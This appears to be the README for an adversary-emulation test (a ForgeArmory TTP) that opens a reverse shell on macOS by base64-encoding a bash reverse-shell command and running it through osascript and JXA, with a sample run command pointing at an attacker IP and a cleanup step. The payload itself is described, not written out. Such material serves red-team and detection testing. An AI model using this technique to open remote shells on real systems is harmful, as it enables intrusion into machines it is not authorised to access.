# Reverse Shell using javascript

## Description
This TTP uses JavaScript (JXA) to run an encoded reverse shell on macOS. It base64-encodes a bash reverse shell command and executes it via osascript using a JXA script.

## Arguments
- **attacker_ip**: IP Address of the attacker for the reverse shell connection.

## Requirements
- macOS (darwin) platform.
- A JXA-reverse-shell.js file must be present in the TTP directory.

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//execution/osascript-reverse-shell/ttp.yaml --arg attacker_ip=192.168.1.100
```

## Steps
1. **run-reverse-shell** (Step 1): Base64-encodes a bash reverse shell command targeting the specified attacker IP on port 4444 and stores the result as an output variable.
2. **run-reverse-shell** (Step 2): Executes the JXA-reverse-shell.js script via osascript, passing the base64-encoded command as an argument to establish the reverse shell.
3. **cleanup**: Kills any running reverse shell processes by finding and terminating `bash -i` processes.
